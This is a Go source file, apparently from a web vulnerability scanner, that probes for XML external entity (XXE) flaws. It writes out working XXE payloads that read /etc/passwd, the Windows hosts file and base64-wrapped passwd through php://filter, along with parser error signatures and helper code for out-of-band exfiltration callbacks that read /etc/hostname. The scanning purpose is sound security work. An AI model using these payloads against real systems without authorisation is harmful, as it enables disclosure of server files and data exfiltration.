package injection

import (
	"bytes"
	"net/url"
	"strings"
)

// xxeBaselineDoc is sent first per candidate so the check can measure
// markers/errors already present in the page for a benign XML POST.
// Anything that survives subtraction against this baseline is genuinely
// attributable to the XXE payload that follows.
const xxeBaselineDoc = `<?xml version="1.0" encoding="UTF-8"?><hyperz-baseline/>`

// xxeFileDiscloseDocs are payloads that try to dereference a privileged
// system file into the response. Both POSIX (/etc/passwd) and Windows
// (hosts) variants ride so the same probe covers either OS without a
// callsite branch. The DOCTYPE syntax is the classic in-band XXE shape:
// declare a SYSTEM-resolved external entity and reference it from the
// document body.
//
// The php://filter variants exist because /etc/passwd contains bytes
// (line breaks, colons) that an XML parser may reject when inlined as
// entity-expanded text, dropping the disclosure before it lands in the
// response. PHP's stream filter wraps the file in base64 first, which
// is XML-clean - the matcher then looks for the base64-encoded
// "root:x:0:0:" prefix instead of the raw passwd line. Same payload
// also lets the check read PHP source files (.php) that would otherwise
// be inlined as nested XML and break the parse.
var xxeFileDiscloseDocs = []string{
	`<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` +
		`<foo>&xxe;</foo>`,
	`<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>` +
		`<foo>&xxe;</foo>`,
	`<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>` +
		`<foo>&xxe;</foo>`,
	`<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">]>` +
		`<foo>&xxe;</foo>`,
}

// xxeBase64Markers are content needles that prove a php://filter
// base64-encoded file disclosure landed. The php://filter
// convert.base64-encode stream encodes the file from its first byte
// in a continuous run, so the base64 prefix of /etc/passwd's
// "root:x:0:" - the stable first 9 bytes that don't depend on the
// 10th byte - emerges verbatim at the start of the encoded blob.
// A hit here is equivalent in meaning to a TraversalMarkers hit on
// the plaintext.
//
// "cm9vdDp4OjA6" is base64("root:x:0:"). 12 chars (= 9 bytes), the
// largest aligned prefix of /etc/passwd whose encoding does not
// depend on byte 10 of the file - byte 10 spills into the high bits
// of the 13th base64 char, so a longer marker would have to predict
// the gid digit (0 for root, but not enforceable). 12 chars is long
// enough not to collide with prose (the alphabet is mixed-case + the
// 9 + 6 = base64 digits).
//
// No Windows analog: php://filter is a PHP-only wrapper and the
// Windows hosts file is small enough that the plaintext matcher
// already catches it without base64 wrapping.
var xxeBase64Markers = []string{
	"cm9vdDp4OjA6",
}

// xxeErrorDocs are payloads engineered to make a permissive XML parser
// surface a parser-specific error signature even when external entity
// resolution is blocked. Each one reaches the entity-resolution path so a
// hardened parser still raises a recognizable exception; a parser that
// never sees XML simply echoes the bytes verbatim.
var xxeErrorDocs = []string{
	// Undefined entity reference: parsers that disallow external entities
	// generally still fail loudly here.
	`<?xml version="1.0" encoding="UTF-8"?><foo>&hyperz_undefined_xxe_canary;</foo>`,
	// SYSTEM entity pointing at a definitely-nonexistent file path: parsers
	// that DO resolve externals expose the file-not-found error string.
	`<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///hyperz_xxe_probe_does_not_exist_xyz">]>` +
		`<foo>&xxe;</foo>`,
}

// xxeErrorPatterns are lowercase substrings of XML parser error signatures
// across major runtimes. Caller lowercases the response body before
// matching. Curated to cover the dominant parsers (libxml, expat, SAX,
// xerces, .NET XmlException, nokogiri, simplexml) without overlapping into
// generic English.
var xxeErrorPatterns = []string{
	// libxml2 / lxml (Python, PHP DOMDocument, Ruby Nokogiri)
	"undefined entity",
	"entityref:",
	"premature end of data in tag",
	"start tag expected",
	"failed to load external entity",
	"externalentity",
	"xmlsyntaxerror",
	"lxml.etree",
	// expat (Python xml.etree, xml.parsers.expat)
	"expaterror",
	"xml.parsers.expat",
	"xml.etree.elementtree.parseerror",
	"not well-formed (invalid token)",
	"undefined entity:",
	// Java SAX / DocumentBuilder / xerces
	"org.xml.sax.saxparseexception",
	"saxparseexception",
	"javax.xml.parsers",
	"documentbuilder",
	"xmlstreamexception",
	"xerces",
	"the entity",
	"entity \"",
	// PHP simplexml / xml warnings
	"simplexml_load",
	"xml error:",
	"xml parsing error",
	"warning: domdocument",
	// .NET System.Xml
	"system.xml.xmlexception",
	"xmlexception",
	"an internal error occurred while parsing the xml",
	// Ruby REXML
	"rexml::parseexception",
}

// xxeOOBExfilProbeFile is the path the OOB DTD reads via a parameter
// entity. /etc/hostname is single-line and almost universally present
// on POSIX hosts; multi-line files (passwd) break URL formation when
// the parser tries to splice their content into the exfil callback URL.
// A hit with empty data is still proof of parameter-entity expansion,
// which is the capability the check is testing for.
const xxeOOBExfilProbeFile = "file:///etc/hostname"

// extractExfilData pulls the value of the "d" query parameter out of
// the exfil callback path. Returns "" if the parameter is absent or
// undecodable - some parsers URL-encode the file content before
// splicing, others don't, and a few drop the query string entirely
// when newline-containing entity values fail to assemble into a
// well-formed URL.
func extractExfilData(rawPath string) string {
	q := strings.IndexByte(rawPath, '?')
	if q < 0 {
		return ""
	}
	values, err := url.ParseQuery(rawPath[q+1:])
	if err != nil {
		return ""
	}
	return values.Get("d")
}

// matchXXEBase64Markers returns every xxeBase64Markers entry found in
// body. Case-sensitive on purpose: base64 is case-sensitive and a
// case-folded scan would collide with prose words that happen to share
// the alphabet (the marker has no vowel run that case-folding could
// disambiguate from English text).
func matchXXEBase64Markers(body []byte) []string {
	if len(body) == 0 {
		return nil
	}
	var hits []string
	for _, m := range xxeBase64Markers {
		if bytes.Contains(body, []byte(m)) {
			hits = append(hits, m)
		}
	}
	return hits
}

// matchXXEErrors returns every xxeErrorPatterns entry that appears in
// body. Body is lowercased once per call so substring scans are
// case-insensitive.
func matchXXEErrors(body []byte) []string {
	if len(body) == 0 {
		return nil
	}
	lower := bytes.ToLower(body)
	var hits []string
	for _, pat := range xxeErrorPatterns {
		if bytes.Contains(lower, []byte(pat)) {
			hits = append(hits, pat)
		}
	}
	return hits
}

// extractSystemTarget pulls the file:// URL out of an XXE SYSTEM entity
// declaration so the finding detail can name the file the probe asked
// for ("file:///etc/passwd") without dumping the full XML payload. Falls
// back to "external entity" when the doc isn't shaped like one of our
// canned templates.
func extractSystemTarget(doc string) string {
	const marker = `SYSTEM "`
	i := strings.Index(doc, marker)
	if i < 0 {
		return "external entity"
	}
	rest := doc[i+len(marker):]
	end := strings.Index(rest, `"`)
	if end < 0 {
		return "external entity"
	}
	return rest[:end]
}
